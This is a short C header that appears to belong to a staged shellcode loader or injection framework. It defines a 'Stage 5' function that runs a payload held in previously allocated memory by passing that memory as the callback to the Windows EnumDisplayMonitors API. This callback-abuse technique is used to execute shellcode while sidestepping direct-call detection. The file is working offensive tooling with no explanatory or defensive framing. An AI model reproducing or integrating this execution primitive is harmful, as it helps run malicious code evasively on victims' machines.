#pragma once
#include <windows.h>
#include "../../core/utils.h"
#include "../context.h"

inline BOOL Stage5_Exec_DisplayMonitors(TechniqueContext* ctx)
{

    if (!ctx || !ctx->allocated_mem)
        return FALSE;

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Execute payload at %p", ctx->allocated_mem);
#endif

    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ctx->allocated_mem, NULL);


#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Execution finished");
#endif

    return TRUE;
}